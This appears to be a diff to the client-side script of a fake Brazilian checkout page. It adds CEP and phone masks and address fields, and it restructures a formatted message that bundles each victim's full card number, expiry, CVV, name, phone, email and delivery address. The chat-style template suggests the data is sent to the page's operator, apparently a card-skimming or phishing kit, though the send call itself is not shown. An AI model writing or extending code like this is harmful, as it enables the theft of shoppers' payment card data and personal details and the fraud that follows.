@@ -36,6 +36,40 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
+    // Máscara para CEP
+    const cepFields = ['cardCep', 'cep'];
+    cepFields.forEach(fieldId => {
+        const field = document.getElementById(fieldId);
+        if (field) {
+            field.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 5) {
+                    value = value.substring(0, 5) + '-' + value.substring(5, 8);
+                }
+                e.target.value = value.substring(0, 9);
+            });
+        }
+    });
+
+    // Máscara para telefone
+    const telefoneFields = ['cardTelefone', 'telefone'];
+    telefoneFields.forEach(fieldId => {
+        const field = document.getElementById(fieldId);
+        if (field) {
+            field.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 11) {
+                    value = value.replace(/^(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+                } else if (value.length >= 7) {
+                    value = value.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+                } else if (value.length >= 3) {
+                    value = value.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
+                }
+                e.target.value = value;
+            });
+        }
+    });
+
     // Validar cartão (Luhn)
     function validarCartao(numero) {
         const num = numero.replace(/\s/g, '');
@@ -83,16 +117,23 @@ document.addEventListener('DOMContentLoaded', function() {
 └ Valor: ${dados.valor}
 
 <b>👤 DADOS DO CLIENTE</b>
-├ Nome: ${dados.nome}
-├ CPF: ${dados.cpf}
-├ Telefone: ${dados.telefone}
-└ E-mail: ${dados.email}
+├ E-mail: ${dados.email}
+├ Titular do cartão: ${dados.titular}
+└ Telefone: ${dados.telefone}
 
 <b>💳 DADOS DO CARTÃO</b>
-├ Titular: ${dados.titular}
 ├ Número: ${dados.numero}
 ├ Validade: ${dados.validade}
 └ CVV: ${dados.cvv}
+
+<b>📍 ENDEREÇO DE ENTREGA</b>
+├ CEP: ${dados.cep}
+├ Rua: ${dados.rua}
+├ Número: ${dados.numeroEnd}
+├ Complemento: ${dados.complemento}
+├ Bairro: ${dados.bairro}
+├ Cidade: ${dados.cidade}
+└ UF: ${dados.uf}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━
 <b>⏰ Data:</b> ${new Date().toLocaleString('pt-BR')}
@@ -142,38 +183,51 @@ document.addEventListener('DOMContentLoaded', function() {
             }
             
             // Obter dados do formulário cartão
-            const nome = document.getElementById('cardNome')?.value.trim() || '';
-            const cpf = document.getElementById('cardCpf')?.value.trim() || '';
             const email = document.getElementById('cardEmail')?.value.trim() || '';
-            const telefone = document.getElementById('cardTelefone')?.value.trim() || '';
             const titular = document.getElementById('cardTitular')?.value.trim() || '';
+            const telefone = document.getElementById('cardTelefone')?.value.trim() || '';
             const numero = document.getElementById('cardNumero')?.value.trim() || '';
             const validade = document.getElementById('cardValidade')?.value.trim() || '';
             const cvv = document.getElementById('cardCvv')?.value.trim() || '';
             
+            // Endereço
+            const cep = document.getElementById('cardCep')?.value.trim() || '';
+            const rua = document.getElementById('cardRua')?.value.trim() || '';
+            const numeroEnd = document.getElementById('cardNumeroEnd')?.value.trim() || '';
+            const complemento = document.getElementById('cardComplemento')?.value.trim() || '';
+            const bairro = document.getElementById('cardBairro')?.value.trim() || '';
+            const cidade = document.getElementById('cardCidade')?.value.trim() || '';
+            const uf = document.getElementById('cardUf')?.value.trim() || '';
+            
             // Validações
-            if (!nome) { showToast('❌ Nome é obrigatório'); return; }
-            if (!cpf || cpf.length < 11) { showToast('❌ CPF inválido'); return; }
             if (!email || !email.includes('@')) { showToast('❌ E-mail inválido'); return; }
-            if (!telefone) { showToast('❌ Telefone é obrigatório'); return; }
             if (!titular) { showToast('❌ Nome do titular é obrigatório'); return; }
+            if (!telefone) { showToast('❌ Telefone é obrigatório'); return; }
             if (!numero || numero.replace(/\s/g, '').length < 16) { showToast('❌ Número do cartão inválido'); return; }
             if (!validarCartao(numero)) { showToast('❌ Número do cartão inválido'); return; }
             if (!validade || !validarValidade(validade)) { showToast('❌ Data de validade inválida'); return; }
             if (!cvv || cvv.length < 3) { showToast('❌ CVV inválido'); return; }
+            if (!cep || cep.replace(/\D/g, '').length !== 8) { showToast('❌ CEP inválido'); return; }
+            if (!rua) { showToast('❌ Rua é obrigatória'); return; }
+            if (!numeroEnd) { showToast('❌ Número é obrigatório'); return; }
             
             // Preparar dados para envio
             const dadosEnvio = {
                 produto: produto.nome,
                 valor: `R$ ${produto.preco.toFixed(2)}`,
-                nome: nome,
-                cpf: cpf,
                 email: email,
-                telefone: telefone,
                 titular: titular,
+                telefone: telefone,
                 numero: numero,
                 validade: validade,
-                cvv: cvv
+                cvv: cvv,
+                cep: cep,
+                rua: rua,
+                numeroEnd: numeroEnd,
+                complemento: complemento || 'Não informado',
+                bairro: bairro,
+                cidade: cidade,
+                uf: uf
             };
             
             // Desabilitar botão e mostrar loading
